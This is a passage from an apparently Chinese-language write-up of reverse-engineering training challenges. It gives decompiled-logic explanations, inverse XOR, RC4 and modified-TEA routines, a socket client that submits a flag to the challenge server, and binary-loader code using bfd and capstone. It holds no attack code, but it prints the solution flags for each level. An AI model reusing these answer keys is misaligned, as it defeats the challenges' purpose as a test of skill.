class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">2</span>; j &gt;= <span class="number">0</span>;--j)</span><br><span class="line">        &#123;</span><br><span class="line">            buf[i] -= v0--;</span><br><span class="line">            buf[i] ^= i ^ j ^ <span class="number">0x32</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ans[i] = buf[i];</span><br><span class="line">    &#125;</span><br><span class="line">    ans[<span class="number">15</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, ans);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：<strong>SYC{0h_y0u1_finD0V0}</strong></p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>ida：</p><p><img src="https://s2.loli.net/2022/11/01/sXh8FmTYcDK6bUw.png" alt="main"></p><p>进去之后第一感觉会发现main是个scanf函数，但是点进去之后会发现这个东西，让调试才能查看代码；点进这个函数之后会发现是个线程创建，注意调试时改变if判断的变量值为1；</p><p>在线程中可以发现以下代码：</p><p><img src="https://s2.loli.net/2022/11/01/fKCjik9e7dcswoZ.png" alt="thread"></p><p>在thread main 函数里有两个函数：check() 和 encrypt() ；</p><p>check一开始就执行，判断长度，以及输入的内容必须为数字；</p><p>encrypt读入key和输入的数据，将数据前12位与key加密运算；</p><p>最后比较数据；</p><p>写出encrypt的逆向算法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">12</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (key[i])</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            v4 += <span class="number">23</span>;<span class="comment">//无用</span></span><br><span class="line">            v3 ^= <span class="number">5</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            us[i] ^= key[i];<span class="comment">//不变</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">161</span>:</span><br><span class="line">            us[i] -= <span class="number">2</span> * key[i];<span class="comment">//减等</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">196</span>:</span><br><span class="line">            us[i] -= <span class="number">10</span>;<span class="comment">//减等</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">229</span>:</span><br><span class="line">            <span class="comment">//v3 = 8 * ((v4 + 6) &gt;&gt; (v4 &amp; 3));无用</span></span><br><span class="line">            us[i] = <span class="built_in">inter</span>(us[i]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inter</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a - <span class="number">0x19</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将比较数据经过以上运算得到flag：<strong>SYC{03062639056784}</strong></p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>ida进去可以发现是加壳了，函数很少；</p><p>打开二进制格式搜索upx，果然就找到了老朋友：</p><p><img src="https://s2.loli.net/2022/11/01/4qWFzD8ngvBEXOl.png" alt="unpack"></p><p>upx加壳的标识码是 UPX! 全大写，拿不准改哪个就全部 Upx 都改成 UPX；</p><p>改完就可以脱壳了；</p><p>看代码：</p><p><img src="https://s2.loli.net/2022/11/01/OoUJV9mjlkSLMs1.png" alt="main"></p><p>看不懂子进程作用，反正主要内容在父进程里：输入内容后，先进入change函数，把4个4个的char内容放到4单位的int里；然后把这个int数组放到xor函数里，把每个字节都和j做异或运算，最后和v19比较数据，v19的内容就是cpy的16长度的字符串；</p><p>异或的逆运算还是异或，写出复原代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i = i + <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            we[i] = we[i] ^ j;</span><br><span class="line">            we[i + <span class="number">1</span>] = we[i + <span class="number">1</span>] ^ (j + <span class="number">1</span>); </span><br><span class="line">            we[i + <span class="number">2</span>] = we[i + <span class="number">2</span>] ^ (j + <span class="number">2</span>);</span><br><span class="line">            we[i + <span class="number">3</span>] = we[i + <span class="number">3</span>] ^ (j + <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>将逆向得到的cpy字符串带入we得到flag：<strong>SYC{0k_y0u_s0lv3_it_}</strong></p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>这道题缺库不能调，直接看静态；</p><p>ida:</p><p><img src="https://s2.loli.net/2022/11/01/JosKVDhp8uG6CzZ.png" alt="main"></p><p>左图main函数，右图rc4函数，将enter用rc4加密了,密钥是 <code>syclover:)</code>；</p><p>使用大厨把enter加密后的内容烤出来：（<a href="https://gchq.github.io/CyberChef/">CyberChef (gchq.github.io)</a>）</p><p><img src="https://s2.loli.net/2022/11/01/eG14IYzog8ibysc.png" alt="chef"></p><p>发现开头是ELF，说明这加密出来的内容是个elf文件，将其写入二进制文件再用ida打开：</p><p><img src="https://s2.loli.net/2022/11/02/AUOTdGoit1JLp3c.png" alt="main"></p><p>属于就正常了；</p><p><img src="https://s2.loli.net/2022/11/02/JItDwv6UbOjHkKZ.png" alt="func"></p><p>如上可知，输入16长度内容，然后进行tea算法(小魔改，每次异或了i)，之后比较数据；</p><p>写出逆算法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>  j = <span class="number">0</span>,l , r ,sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> v[<span class="number">4</span>] = &#123; <span class="number">0x6A318EC6</span> , <span class="number">0x5B898EC2</span> , <span class="number">0x42FB5DD1</span> , <span class="number">0x50AC4C5F</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> k[<span class="number">4</span>] = &#123;<span class="number">0x11</span> , <span class="number">0x22</span> , <span class="number">0x33</span> , <span class="number">0x44</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (j &lt; <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">l = v[j];</span><br><span class="line">r = v[j+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">sum += DELTA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">31</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">&#123;</span><br><span class="line">r -= (k[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ (((l &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * l)) + l) ^ i;</span><br><span class="line">sum -= DELTA;</span><br><span class="line">l -= (k[sum &amp; <span class="number">3</span>] + sum) ^ (((r &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * r)) + r) ^ i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v[j] = l;</span><br><span class="line">v[j + <span class="number">1</span>] = r;</span><br><span class="line"></span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line">j += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* p;</span><br><span class="line">p = (<span class="keyword">char</span> *)v;</span><br><span class="line">p[<span class="number">16</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, p);</span><br></pre></td></tr></table></figure><p>得到flag：<strong>SYC{w3f-2hs-ij7-9is}</strong></p><h3 id="调试GLIBC-2-34小技巧"><a href="#调试GLIBC-2-34小技巧" class="headerlink" title="调试GLIBC_2.34小技巧"></a>调试GLIBC_2.34小技巧</h3><h4 id="安装glibc-all-in-one"><a href="#安装glibc-all-in-one" class="headerlink" title="安装glibc-all-in-one"></a>安装glibc-all-in-one</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo git clone https://github.com/matrix1001/glibc-all-in-one.git </span><br><span class="line">cd glibc-all-in-one/</span><br><span class="line">sudo python3 update_list</span><br></pre></td></tr></table></figure><p>下载glibc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./download 2.35-0ubuntu3_amd64</span><br></pre></td></tr></table></figure><h4 id="安装patchelf"><a href="#安装patchelf" class="headerlink" title="安装patchelf"></a>安装patchelf</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/NixOS/patchelf.git</span><br><span class="line">cd patchelf</span><br><span class="line">sudo apt-get install autoconf automake libtool</span><br><span class="line">./bootstrap.sh </span><br></pre></td></tr></table></figure><p>继续：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h4 id="配置ld-so"><a href="#配置ld-so" class="headerlink" title="配置ld.so"></a>配置ld.so</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter path/to/.so the/elf/you/debug</span><br></pre></td></tr></table></figure><h4 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-rpath path/to/.so the/elf/you/debug</span><br></pre></td></tr></table></figure><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><blockquote><p>逆向一个CPP服务器，得到flag，并编写socket客户端和远程服务器提交flag;</p></blockquote><h3 id="逆"><a href="#逆" class="headerlink" title="逆"></a>逆</h3><p>ida查看服务器：</p><p><img src="https://s2.loli.net/2022/11/03/TcL4DovPZhJQiCK.png" alt="main"></p><p>这是一个服务端框架，首先创建套接字类型文件，并返回fd文件饰描述符；</p><p>然后和IP端口进行绑定；</p><p>之后一直监听这个端口，直到接收客户端请求，执行处理，并且是多线程的处理；</p><p>而处理的主体在 CTask_server 里可以找到：</p><p><img src="https://s2.loli.net/2022/11/03/5fXqzLwCBQjFG74.png" alt="true"></p><p>先发送 “Please …” (send) 到客户端，然后等待输入，被inside变量接收，之后进入cc加密，和tt生成的v7进行比较数据；</p><p>看看里面加密吧，都tea ptsd了，不想放图了；直接来吧：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>  j = <span class="number">0</span>, l, r, sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> v[<span class="number">3</span>] = &#123; <span class="number">0xED3E9980</span> , <span class="number">0x57284856</span> ,<span class="number">0</span> &#125;;<span class="comment">//从tt里抄的</span></span><br><span class="line"><span class="keyword">int</span> k[<span class="number">4</span>] = &#123; <span class="number">0x6C</span> , <span class="number">0x30</span> , <span class="number">0x76</span> , <span class="number">0x33</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l = v[<span class="number">0</span>];</span><br><span class="line">r = v[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">sum += DELTA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">31</span>; i &gt;= <span class="number">0</span>; --i)<span class="comment">//小魔改tea</span></span><br><span class="line">&#123;</span><br><span class="line">r -= ((l &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]) ^ (l + sum) ^ (<span class="number">16</span> * l + k[<span class="number">2</span>]) ^ i;</span><br><span class="line">l -= ((r &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]) ^ (r + sum) ^ (<span class="number">16</span> * r + k[<span class="number">0</span>]) ^ i;</span><br><span class="line">sum -= DELTA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v[<span class="number">0</span>] = l;</span><br><span class="line">v[<span class="number">1</span>] = r;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* p = (<span class="keyword">char</span>*)v;</span><br><span class="line">p[<span class="number">9</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, p);</span><br></pre></td></tr></table></figure><p>得到flag：<strong>D0Y0uKSk</strong></p><h3 id="写"><a href="#写" class="headerlink" title="写"></a>写</h3><p>如同服务端，自己写的客户端也需要一个框架，然后把发送的flag放到主体里就行；</p><p>根据题目中的链接，可以知道客户端只需要使用socket创建套接字后通过ip端口连接就行；</p><p>那么大概的框架就是： socket() -&gt; 结构地址 -&gt; connect() 连接到地址 -&gt; 读 &amp; 写 -&gt; close() 结束;</p><p>内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Client Start\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> fd = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);               <span class="comment">//逆向得到的参数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> lines[] = <span class="string">&quot;D0Y0uKSk&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>;</span>               <span class="comment">//套接字结构地址</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;serv_addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line">    serv_addr.sin_family = AF_INET;             <span class="comment">//IPv4</span></span><br><span class="line">    serv_addr.sin_addr.s_addr = inet_addr(<span class="string">&quot;1.14.92.115&quot;</span>);   <span class="comment">//地址</span></span><br><span class="line">    serv_addr.sin_port = htons(<span class="number">1234</span>);           <span class="comment">//端口</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Connecting..\n&quot;</span>);</span><br><span class="line">    connect(fd, (struct sockaddr*)&amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr));   <span class="comment">//接通accept</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Done !\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">40</span>];        <span class="comment">//回响容器</span></span><br><span class="line">    read(fd, buffer, <span class="keyword">sizeof</span>(buffer) - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, lines);</span><br><span class="line">    write(fd, lines, <span class="keyword">sizeof</span>(lines) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    read(fd, buffer, <span class="keyword">sizeof</span>(buffer) - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://s2.loli.net/2022/11/03/BGqOMS58xpjtnrb.png" alt="pass"></p><h3 id="更多socket学习"><a href="#更多socket学习" class="headerlink" title="更多socket学习"></a>更多socket学习</h3><p><a href="https://blog.csdn.net/m0_37947204/article/details/80489431">https://blog.csdn.net/m0_37947204/article/details/80489431</a></p><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><blockquote><p>给二进制加载器实现更多功能：1、转储节内容 2、输出数据符号 3、使用capstone反汇编.text段；</p></blockquote><p>称之为环境恶心人之题；</p><p>题不难，但在wsl上装环境会变得千奇百怪，反正就是跑不起来，只有vm搞；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo</span><br><span class="line">apt-get install binutils-dev</span><br><span class="line">apt-get install libcapstone-dev</span><br></pre></td></tr></table></figure><p>完成这道题需要知晓一点点bfd和capstone，以及更多的模仿；</p><p>注意引头 bfd.h 和 capstone/capstone.h；</p><p>题目已经把各种各样的代码都实现好了，只要求增添几个功能，逐一实现：</p><h3 id="转储节内容"><a href="#转储节内容" class="headerlink" title="转储节内容"></a>转储节内容</h3><p>这里要求命令行输入三个参数，而第三个参数为节名称，并打印节的原始字节；</p><p>那么可以在原来打印节的地方（main.cc）镶嵌一个东西进去：</p><p><img src="https://s2.loli.net/2022/11/06/FlkOx8SRGnKYqjM.png" alt="one"></p><p>flag一开始设置为0，找到同名节后设置为1；</p><p>第一个判断是否有三个参数并且调控数为0，则执行这个函数；</p><p>外面的判断是如果没有找到第三个参数一样的节名称，则此时flag依然是0，所以执行打印没有找到；</p><p>下面是函数具体实现：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">print_origin_bytes</span><span class="params">(Section* sec, <span class="keyword">char</span> *one)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(sec-&gt;name == one)<span class="comment">//找到同名则进入</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;contents of %s section\n&quot;</span>, one);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;        &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">16</span> ; i++)<span class="comment">//打印开头的 00~0f</span></span><br><span class="line">        &#123;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">&quot;%02jx &quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">        i = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;        &quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(j &lt; sec-&gt;size)    <span class="comment">//循环打印</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%02jx &quot;</span>, sec-&gt;bytes[j++]);</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">16</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                i = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;        &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;<span class="comment">//设置flag为1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="输出数据符号"><a href="#输出数据符号" class="headerlink" title="输出数据符号"></a>输出数据符号</h3><p>找到 loader.h 中的symbol类，可以发现 SymbolType 里面只有  SYM_TYPE_UKN SYM_TYPE_FUNC 两个，需要打印 DATA 符号，则添加一个 <code>SYM_TYPE_DATA = 2,</code> ;</p><p>之后找到 loader.cc 中的一个函数：load_symbol_bfd，可以发现其中有一步是给函数添加 FUNC项的，镶嵌如下内容：</p><p><img src="https://s2.loli.net/2022/11/06/8uVxkC31FnlgLrT.png" alt="two"></p><p>当不添加FUNC项的内容时，添加DATA就好了；</p><p>最后改变下main.cc里面打印符号的地方为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; %-40s 0x%016jx %s\n&quot;</span>,</span><br><span class="line">                   sym-&gt;name.<span class="built_in">c_str</span>(),</span><br><span class="line">                   sym-&gt;addr,</span><br><span class="line">                   (sym-&gt;type &amp; Symbol::SYM_TYPE_FUNC) ? <span class="string">&quot;FUNC&quot;</span> : <span class="string">&quot;DATA&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="使用capstone反汇编-text段"><a href="#使用capstone反汇编-text段" class="headerlink" title="使用capstone反汇编.text段"></a>使用capstone反汇编.text段</h3><p>吐槽一下，edge搜索capstone 反汇编会出现一个博客，详细的记录了如何使用capstone；</p><p>具体函数实现：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">disass_text</span><span class="params">(Binary bin)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    csh dis;</span><br><span class="line">    cs_insn *insns;</span><br><span class="line">    Section *text;</span><br><span class="line">    <span class="keyword">size_t</span> n, i;</span><br><span class="line">    Section* sec;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取text节</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; bin.sections.<span class="built_in">size</span>(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sec = &amp;bin.sections[i];</span><br><span class="line">        <span class="keyword">if</span>(sec-&gt;name == <span class="string">&quot;.text&quot;</span>)</span><br><span class="line">            text = sec;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!text)   <span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化capstone</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">cs_open</span>(CS_ARCH_X86, CS_MODE_64, &amp;dis) != CS_ERR_OK)</span><br><span class="line">        <span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反汇编把内容放insns里； （ 返回0就是版本问题 （（</span></span><br><span class="line">    n = <span class="built_in">cs_disasm</span>(dis, text-&gt;bytes, text-&gt;size, text-&gt;vma, <span class="number">0</span>, &amp;insns);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(n &lt;= <span 